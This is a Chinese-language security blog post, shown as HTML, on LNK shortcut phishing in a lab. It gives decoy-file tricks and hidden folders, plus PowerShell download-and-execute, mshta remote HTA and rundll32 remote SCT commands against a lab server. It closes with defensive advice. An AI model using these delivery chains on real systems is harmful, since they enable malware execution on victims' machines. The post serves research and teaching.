@@ -1,0 +1,351 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+        <title>lnk 文件钓鱼实验 - the0n3</title>
+        <meta name="description" content="LNK 文件钓鱼实验（Windows）：拆解快捷方式钓鱼的完整攻击链——修改 LNK 的目标、起始位置、运行方式与图标，把恶意程序伪装成 PDF / 文本等常见文档，配合隐藏目录与迷惑文件诱导点击；并进阶演示 PowerShell 远程加载的无文件落地，以及 mshta.exe 加载 HTA、rundll32.exe 加载远程 SCT 等隐蔽跳板，最后给出防御建议。">
+    <link rel="canonical" href="https://the0n3.top/posts/lnk-file-phishing/">
+    <!-- Open Graph -->
+    <meta property="og:title" content="lnk 文件钓鱼实验">
+    <meta property="og:description" content="LNK 文件钓鱼实验（Windows）：拆解快捷方式钓鱼的完整攻击链——修改 LNK 的目标、起始位置、运行方式与图标，把恶意程序伪装成 PDF / 文本等常见文档，配合隐藏目录与迷惑文件诱导点击；并进阶演示 PowerShell 远程加载的无文件落地，以及 mshta.exe 加载 HTA、rundll32.exe 加载远程 SCT 等隐蔽跳板，最后给出防御建议。">
+    <meta property="og:url" content="https://the0n3.top/posts/lnk-file-phishing/">
+    <meta property="og:type" content="article">
+    <meta property="og:site_name" content="the0n3">
+    <meta property="og:locale" content="zh_CN">
+        <meta property="og:image" content="https://the0n3.top/images/lnk-file-phishing/1.png">
+        <!-- Twitter Card -->
+    <meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:title" content="lnk 文件钓鱼实验">
+    <meta name="twitter:description" content="LNK 文件钓鱼实验（Windows）：拆解快捷方式钓鱼的完整攻击链——修改 LNK 的目标、起始位置、运行方式与图标，把恶意程序伪装成 PDF / 文本等常见文档，配合隐藏目录与迷惑文件诱导点击；并进阶演示 PowerShell 远程加载的无文件落地，以及 mshta.exe 加载 HTA、rundll32.exe 加载远程 SCT 等隐蔽跳板，最后给出防御建议。">
+        <meta name="twitter:image" content="https://the0n3.top/images/lnk-file-phishing/1.png">
+        <script>
+        (function () {
+            try {
+                var key = 'theme';
+                var saved = localStorage.getItem(key);
+                var theme = (saved === 'dark' || saved === 'light') ? saved : 'light';
+                document.documentElement.setAttribute('data-theme', theme);
+                document.documentElement.style.colorScheme = theme;
+            } catch (e) {
+                document.documentElement.setAttribute('data-theme', 'light');
+                document.documentElement.style.colorScheme = 'light';
+            }
+        })();
+    </script>
+    <!-- 评论系统预连接：giscus 由前端按访客主题动态注入，提前建连可抵消注入延迟 -->
+    <link rel="preconnect" href="https://giscus.app" crossorigin>
+    <!-- 使用 GitHub Markdown 样式 -->
+    <link rel="stylesheet" href="/assets/css/github-markdown.css">
+    <link rel="stylesheet" href="/assets/css/site.css">
+    <!-- 功能样式（自动扫描 assets/features/ 目录） -->
+        <link rel="stylesheet" href="/assets/features/code-fold/style.css">
+        <link rel="stylesheet" href="/assets/features/image-enhance/style.css">
+        <link rel="stylesheet" href="/assets/features/nav-menu/style.css">
+        <link rel="stylesheet" href="/assets/features/reading-progress/style.css">
+        <link rel="stylesheet" href="/assets/features/tax-accordion/style.css">
+        <link rel="stylesheet" href="/assets/css/nav-reveal.css">
+    <link rel="stylesheet" href="/assets/css/search.css">
+    <!-- 代码高亮样式 -->
+    <link rel="stylesheet" href="/assets/prism/prism.css">
+</head>
+<body>
+    <div class="reading-progress" aria-hidden="true">
+        <div class="reading-progress__bar"></div>
+    </div>
+    <header>
+        <nav>
+            <div class="nav-right">
+                <details class="nav-menu">
+                    <summary class="nav-toggle" aria-label="打开菜单"><span aria-hidden="true">☰</span></summary>
+                </details>
+                <div class="nav-links">
+                                <a href="/">首页</a>
+                                <a href="/archives/">归档</a>
+                                <a href="/categories/">分类</a>
+                                <a href="/tags/">标签</a>
+                                <a href="/friends/">友链</a>
+                                <a href="/about/">关于</a>
+                                <a href="https://www.travellings.cn/go.html">开往</a>
+                                                </div>
+                <button
+                    id="searchTrigger"
+                    class="search-trigger"
+                    type="button"
+                    aria-label="打开搜索"
+                    aria-haspopup="dialog"
+                    aria-controls="searchModal"
+                    title="搜索（/）"
+                >
+                    <span class="search-trigger__label">搜索</span>
+                    <span class="search-trigger__hint">/</span>
+                </button>
+            </div>
+        </nav>
+    </header>
+                <div class="page-layout">
+            <main class="markdown-body">
+                
+<article class="post-content">
+    <h1>lnk 文件钓鱼实验</h1>
+    <p>
+        <span class="meta">发布于: 2026-09-21 12:03</span>
+    </p>
+    <div class="post-body">
+        <p>LNK文件钓鱼是一种常见的网络钓鱼攻击方式，它滥用Windows系统对快捷方式文件的“信任”，伪装成合法文件，通过社会工程学诱导用户点击，触发一个由系统合法组件构成的多阶段攻击链，最终在内存中执行恶意载荷。</p>
+<p>本文仅用于网络安全技术研究与防御教学，所有实验均在隔离的虚拟机环境中完成。文中涉及的 LNK 钓鱼手法、远程加载技术及跳板利用方式，严禁用于任何未经授权的真实攻击或非法用途。读者应遵守《网络安全法》等相关法律法规，因滥用本文内容造成的一切后果由使用者自行承担。</p>
+<h2>lnk文件属性</h2>
+<p>以 Steam 桌面快捷方式为例，打开文件属性，可以看到文件属性中包含一个快捷方式指向的URL，以及快捷方式指向的图标等等。</p>
+<p><img src="/images/lnk-file-phishing/1.png" alt="lnk文件属性" decoding="async" width="543" height="796"></p>
+<p>其中以下几个属性：</p>
+<ul>
+<li>目标(T)：指定启动程序和参数，在钓鱼攻击中，注入 cmd/powershell 命令，用空格隐藏恶意参数。</li>
+<li>起始位置(S)：指定程序的工作目录，通常是恶意程序所在目录。</li>
+<li>运行方式(R)：指定程序的窗口状态，通常设置为最小化或隐藏，以避免用户注意到恶意程序的执行。</li>
+<li>备注(O)：指定快捷方式的描述信息。</li>
+<li>更改图标(I)：指定快捷方式图标，通常使用常见的文件类型如pdf、文本文件、图片等图标，降低用户的注意力。</li>
+</ul>
+<p>那么在lnk文件钓鱼的整个过程就清晰了，攻击者通过修改快捷方式文件的属性，将目标指向恶意程序，起始位置指向恶意程序所在目录，运行方式设置为最小化或隐藏，更改图标设置为常见文件类型图标，最后，在用户点击快捷方式时，系统会执行恶意程序，完成整个攻击链。</p>
+<h2>实验准备</h2>
+<ol>
+<li>创建一个目录，用于存放恶意程序源码<code>a.c</code>和一个起到烟雾弹作用的迷惑文件<code>a.txt</code>。</li>
+<li>给迷惑文件创建一个快捷方式<code>a.txt.lnk</code>，放在与上面目录同级目录下。</li>
+<li>编译恶意程序，生成可执行文件<code>a.exe</code>。</li>
+<li>修改快捷方式的属性，将目标指向恶意程序，起始位置指向恶意程序所在目录，运行方式设置为最小化或隐藏，更改图标设置为常见文件类型图标。</li>
+</ol>
+<p>结构如下：</p>
+<pre><code class="language-plaintext">新建文件夹
+├── a
+│   ├── a.c
+│   ├── a.exe
+│   └── a.txt
+└── a.txt.lnk</code></pre>
+<h2>钓鱼演示</h2>
+<p>一个简单的演示程序，运行时打开计算器，同时打开迷惑文件</p>
+<pre><code class="language-c">#include &lt;windows.h&gt;
+#include &lt;string.h&gt;
+
+int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance,
+                   LPSTR lpCmdLine, int nCmdShow)
+{
+    char exePath[MAX_PATH];
+    char dirPath[MAX_PATH];
+    char txtPath[MAX_PATH];
+
+    // 取自身完整路径
+    GetModuleFileNameA(NULL, exePath, MAX_PATH);
+
+    // 截掉文件名，留下目录
+    strcpy(dirPath, exePath);
+    char *p = strrchr(dirPath, '\\');
+    if (p) *p = '\0';
+
+    // 拼出 a.txt 的绝对路径
+    wsprintfA(txtPath, "%s\\a.txt", dirPath);
+
+    ShellExecuteA(NULL, "open", txtPath, NULL, dirPath, SW_SHOWNORMAL);
+    ShellExecuteA(NULL, "open", "calc.exe", NULL, dirPath, SW_SHOWNORMAL);
+
+    return 0;
+}</code></pre>
+<p>编译：</p>
+<pre><code class="language-cmd">gcc a.c -o a2.exe -O2 -mwindows -static -lshell32 -luser32</code></pre>
+<p>然后修改快捷方式属性，目标属性可以通过资源管理器<code>explorer.exe</code>来调用我们编译好的恶意程序，起始位置使用环境变量里的当前目录<code>%CD%</code>，运行方式设置为最小化或隐藏，更改图标设置为常见文件类型图标，文件名可以修改为<code>a.txt</code>。</p>
+<p><img src="/images/lnk-file-phishing/2.png" alt="lnk文件属性修改" decoding="async" loading="lazy" width="543" height="771"></p>
+<p>双击<code>a.txt.lnk</code>，可以看到计算器打开了，同时打开了<code>a.txt</code></p>
+<p><img src="/images/lnk-file-phishing/3.png" alt="lnk文件钓鱼效果" decoding="async" loading="lazy" width="1145" height="946"></p>
+<h2>隐藏私货</h2>
+<p>站在受害者的角度，你看到的不是一个孤零零的 a.txt，而是一个文件夹 a，里面躺着 a.c、a.exe、a.txt，外面还有一个 a.txt.lnk，现在怎么让受害者忽略这个夹带私货的目录，把全部注意力只放在这个无害的快捷方式上呢？最简单的办法就是把这个目录隐藏起来。</p>
+<p>下面是三组对照：</p>
+<p>系统开启显示隐藏项目功能，目录没有做隐藏处理，直观看到目录存在。</p>
+<p><img src="/images/lnk-file-phishing/4.png" alt="系统开启显示隐藏项目目录不做隐藏设置下的效果" decoding="async" loading="lazy" width="1059" height="699"></p>
+<p>系统开启显示隐藏项目功能，目录添加了隐藏属性，用户仍然可以看到灰色的目录存在。</p>
+<p><img src="/images/lnk-file-phishing/5.png" alt="系统开启显示隐藏项目目录添加隐藏属性下的效果" decoding="async" loading="lazy" width="964" height="692"></p>
+<p>系统开启显示隐藏项目功能，目录添加了隐藏属性和系统属性，用户无法看到隐藏的目录。</p>
+<p><img src="/images/lnk-file-phishing/6.png" alt="系统开启显示隐藏项目目录添加隐藏属性和系统属性下的效果" decoding="async" loading="lazy" width="1463" height="1000"></p>
+<p>此时，目录仍然存在，但是已经无法看到，只剩下一个快捷方式 a.txt.lnk，测试快捷方式可以正常运行。</p>
+<p><img src="/images/lnk-file-phishing/7.png" alt="隐藏目录下的钓鱼效果" decoding="async" loading="lazy" width="1212" height="962"></p>
+<p>恢复目录的可见性</p>
+<pre><code class="language-cmd">:: h （hidden） s （system）
+attrib -h -s a</code></pre>
+<p><img src="/images/lnk-file-phishing/8.png" alt="恢复目录可见性" decoding="async" loading="lazy" width="1456" height="990"></p>
+<p>在这个实验下，恶意程序存在于同级目录下，常见利用场景就需要压缩整个目录，发送给受害者，受害者解压后看到的就是一个无害的快捷方式，点击后触发恶意程序。</p>
+<h2>无文件落地利用</h2>
+<p>那有没有不依赖这个目录的玩法，把快捷方式的目标写为powershell下载远程恶意内容直接在内存运行？可以，但是这可能会失去常规文件的迷惑性和掩护作用，更容易引起怀疑。</p>
+<p>在远程服务器web服务器上创建一个文件，并使用powershell下载并运行这个文件。</p>
+<pre><code class="language-powershell"># payload.ps1
+Start-Process calc.exe
+Write-Host "Payload executed in memory"</code></pre>
+<p>快捷方式的目标属性值修改为：</p>
+<pre><code class="language-powershell">powershell.exe -WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -Command "IEX (New-Object Net.WebClient).DownloadString('http://192.168.56.111:8081/payload.ps1')"</code></pre>
+<p>成功加载执行远程powershell脚本，打开计算器</p>
+<p><img src="/images/lnk-file-phishing/9.png" alt="lnk文件远程加载执行" decoding="async" loading="lazy" width="1628" height="907"></p>
+<p>通过<a href="https://www.revshells.com/">https://www.revshells.com/</a>生成powershell反弹shell脚本可以做简单的远程控制测试</p>
+<p><img src="/images/lnk-file-phishing/10.png" alt="开启远程web服务器" decoding="async" loading="lazy" width="1897" height="752"></p>
+<p><img src="/images/lnk-file-phishing/11.png" alt="反弹shell远程控制" decoding="async" loading="lazy" width="1214" height="859"></p>
+<p>在远程恶意脚本上，可以添加一些恶意代码，比如远程文件加载到内存执行，下载远程文件到临时目录打开做伪装，抛出些烟雾弹迷惑用户等等。</p>
+<p>无文件场景下的烟雾弹，仍然要服务于让用户看到“正常文件”，达到心理预期，举个例子：快捷方式的图标和文件名让用户以为是一个季度报表的PDF文件，点击后，先下载一个正常的季度报表PDF文件到临时目录并打开，然后在后台执行恶意操作。</p>
+<pre><code class="language-powershell"># 先下载一个正常的诱饵文档到临时目录并打开
+$decoy = "$env:TEMP\季度报表.pdf"
+Invoke-WebRequest "http://192.168.56.111:8081/decoy.pdf" -OutFile $decoy
+Start-Process $decoy
+
+# 再在后台执行恶意操作
+Start-Process calc.exe</code></pre>
+<h2>引入更隐蔽的跳板</h2>
+<p>直接写 powershell.exe -Command "IEX ..." 有一个明显弱点：右键查看 LNK 属性时，目标字段会暴露一长串可疑命令。真实攻击中，攻击者会用 mshta.exe 或 rundll32.exe 作为跳板，让目标字段看起来更“正常”。</p>
+<h3>mshta.exe 加载远程 HTA</h3>
+<p>mshta.exe 是 Windows 自带的 HTML 应用程序宿主，可以直接执行远程 .hta 文件。</p>
+<p>LNK 目标可以写成：</p>
+<pre><code class="language-cmd">mshta http://192.168.56.111:8081/payload.hta</code></pre>
+<p>payload.hta 内容示例：</p>
+<pre><code class="language-html">&lt;html&gt;
+&lt;head&gt;
+&lt;script language="VBScript"&gt;
+    Set shell = CreateObject("WScript.Shell")
+    shell.Run "calc.exe", 0, false
+    window.close
+&lt;/script&gt;
+&lt;/head&gt;
+&lt;body&gt;
+&lt;/body&gt;
+&lt;/html&gt;</code></pre>
+<p><img src="/images/lnk-file-phishing/12.png" alt="mshta.exe 加载远程 HTA" decoding="async" loading="lazy" width="1845" height="923"></p>
+<p>这样 LNK 的目标字段只显示一个 URL，比直接写 PowerShell 命令干净得多。</p>
+<h3>rundll32.exe 调用远程 SCT</h3>
+<p>rundll32 本身不是一个“下载器”，它只是 Windows 提供的一个“调用 DLL 导出函数”的工具。这里利用的是 mshtml.dll 中的 RunHTMLApplication 函数，它能解析 javascript: 协议。但 javascript: 后面的代码能力有限，真正复杂的逻辑（下载、释放、执行）通常放在远程的 SCT 文件里，由 GetObject 拉取后交给脚本引擎执行。</p>
+<p>rundll32.exe 可以配合 javascript: 协议加载远程脚本组件（SCT）：</p>
+<pre><code class="language-cmd">rundll32 javascript:"\..\mshtml,RunHTMLApplication ";document.write();GetObject("script:http://192.168.56.111:8081/payload.sct")</code></pre>
+<p>SCT（Scriptlet）文件是一个 XML 格式的脚本组件，rundll32 会通过 GetObject("script:http://...") 把它下载下来并执行。一个最小的演示用 payload.sct 内容如下：</p>
+<pre><code class="language-xml">&lt;?XML version="1.0"?&gt;
+&lt;scriptlet&gt;
+&lt;registration
+    description="payload"
+    progid="payload"
+    version="1.00"
+    classid="{00000000-0000-0000-0000-000000000000}"
+&gt;
+&lt;/registration&gt;
+&lt;script language="JScript"&gt;
+&lt;![CDATA[
+    var shell = new ActiveXObject("WScript.Shell");
+    shell.Run("calc.exe", 0, false);
+]]&gt;
+&lt;/script&gt;
+&lt;/scriptlet&gt;</code></pre>
+<p>双击快捷方式，加载运行远程SCT脚本，被火绒拦截了</p>
+<p><img src="/images/lnk-file-phishing/13.png" alt="加载远程SCT脚本被火绒拦截" decoding="async" loading="lazy" width="1918" height="936"></p>
+<p>放行看效果</p>
+<p><img src="/images/lnk-file-phishing/14.png" alt="加载远程SCT脚本弹出计算器" decoding="async" loading="lazy" width="1915" height="903"></p>
+<h2>防御措施</h2>
+<ul>
+<li>安装安全软件：安装安全软件，开启实时防护，及时拦截恶意程序的执行。</li>
+<li>限制 LNK 附件：直接在邮件网关阻断 .lnk 扩展名附件，尤其是 ZIP 压缩包内的 LNK 文件。真实攻击常用“简历”“发票”等主题投递，需对这类关键词加严检测。</li>
+<li>强制显示文件扩展名：让用户看到 .pdf.lnk 或 .jpg.lnk 的真实后缀，是成本最低的防御措施。</li>
+<li>教育提示：提示员工对压缩包内的“文档快捷方式”保持警惕——真正的文档双击后应当打开文档，而不是弹出安全警告或什么都不显示。</li>
+<li>临时目录中的脚本落地：监控 %TEMP%、%LOCALAPPDATA%、C:\Users\Public\ 下随机命名的 .ps1、.bat、.vbs 文件创建。</li>
+</ul>    </div>
+        <div class="post-meta-footer">
+                    <span class="post-meta-item">分类:
+                                    <span>Windows</span>
+                            </span>
+                    </div>
+    </article>
+
+
+<section class="post-comments" aria-label="Comments"
+    data-giscus
+    data-theme-mode="auto"
+    data-theme-light="light"
+    data-theme-dark="dark_dimmed"
+    data-repo="Apursuit/the0n3-blog"
+    data-repo-id="R_kgDORvPPbA"
+    data-category="Announcements"
+    data-category-id="DIC_kwDORvPPbM4C5KAt"
+    data-mapping="pathname"
+    data-strict="0"
+    data-reactions-enabled="1"
+    data-emit-metadata="0"
+    data-input-position="bottom"
+    data-lang="zh-CN">
+    <div class="giscus"></div>
+</section>
+
+            </main>
+                <aside class="post-toc" aria-label="Table of contents">
+        <div class="toc-title">目录</div>
+        <nav class="toc-list"></nav>
+    </aside>
+            </div>
+    
+    <!-- 搜索命令面板：
+         第一版先提供标题、日期、标签搜索，以及键盘导航和快捷键 -->
+    <div id="searchModal" class="search-modal" hidden>
+        <div class="search-modal__overlay" data-search-close></div>
+        <div class="search-modal__dialog" role="dialog" aria-modal="true" aria-labelledby="searchModalTitle">
+            <div class="search-modal__panel">
+                <div class="search-modal__header">
+                    <div class="search-modal__title-group">
+                        <div id="searchModalTitle" class="search-modal__title">搜索文章</div>
+                        <div class="search-modal__subtitle">输入标题、标签或关键词，按 Enter 打开结果</div>
+                    </div>
+                    <button
+                        id="searchClose"
+                        class="search-modal__close"
+                        type="button"
+                        aria-label="关闭搜索"
+                        title="关闭搜索"
+                    >
+                        ×
+                    </button>
+                </div>
+
+                <div class="search-modal__body">
+                    <label class="search-input-wrap" for="searchInput">
+                        <span class="search-input-wrap__icon" aria-hidden="true">⌕</span>
+                        <input
+                            id="searchInput"
+                            class="search-input"
+                            type="text"
+                            placeholder="搜索文章..."
+                            autocomplete="off"
+                            spellcheck="false"
+                        >
+                    </label>
+
+                    <div class="search-help">
+                        <span>/ 打开</span>
+                        <span>↑ ↓ 选择</span>
+                        <span>Enter 打开</span>
+                        <span>Esc 关闭</span>
+                    </div>
+
+                    <div id="searchState" class="search-state" aria-live="polite">输入关键词开始搜索</div>
+                    <div id="searchResults" class="search-results" role="listbox" aria-label="搜索结果"></div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <button id="backToTop" class="fab fab-top" type="button" aria-label="返回顶部" title="返回顶部">↑</button>
+    <button id="themeToggle" class="theme-toggle" type="button" aria-label="切换主题" title="切换主题"></button>
+    <script src="/assets/js/site.js"></script>
+    <!-- 功能脚本（自动扫描 assets/features/ 目录） -->
+        <script src="/assets/features/code-fold/script.js"></script>
+        <script src="/assets/features/giscus-theme/script.js"></script>
+        <script src="/assets/features/image-enhance/script.js"></script>
+        <script src="/assets/features/reading-progress/script.js"></script>
+        <script src="/assets/features/tax-accordion/script.js"></script>
+        <script src="/assets/js/navReveal.js"></script>
+    <!-- 启动代码高亮及行号显示 -->
+    <script src="/assets/prism/prism.js"></script>
+    <script src="/assets/prism/prism-line-number.js"></script>
+    <!-- 主题切换 -->
+    <script src="/assets/js/ThemeSwitch.js"></script>
+    <!-- 弹簧动画工具（搜索弹窗/灯箱进出场依赖） -->
+    <script src="/assets/js/spring.js"></script>
+    <!-- 搜索功能 -->
+    <script src="/assets/js/fuse.js"></script>
+    <script src="/assets/js/search.js"></script>
+</body>
+</html>
